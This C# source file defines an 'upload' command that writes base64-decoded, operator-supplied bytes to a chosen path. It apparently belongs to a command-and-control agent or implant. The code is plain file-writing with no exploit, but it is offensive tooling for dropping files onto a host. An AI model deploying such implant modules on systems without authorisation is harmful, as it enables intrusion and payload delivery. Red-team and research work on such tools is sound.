using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
namespace Agent.Commands
{
    public class Upload : AgentCommand
    {
        public override string Name => "upload";

        public override string Execute(AgentTask task)
        {
            if (task.Args is null || task.Args.Length == 0)
            {
                return "No upload path provided";
            }
            try
            {
                var FilePath = task.Args[0];
                var FileContents = task.File;
                File.WriteAllBytes(FilePath, Convert.FromBase64String(FileContents));
                return FilePath;
            } catch (Exception e)
            {
                return $"Failed to upload file {e.Message}";
            }
        }
    }
}
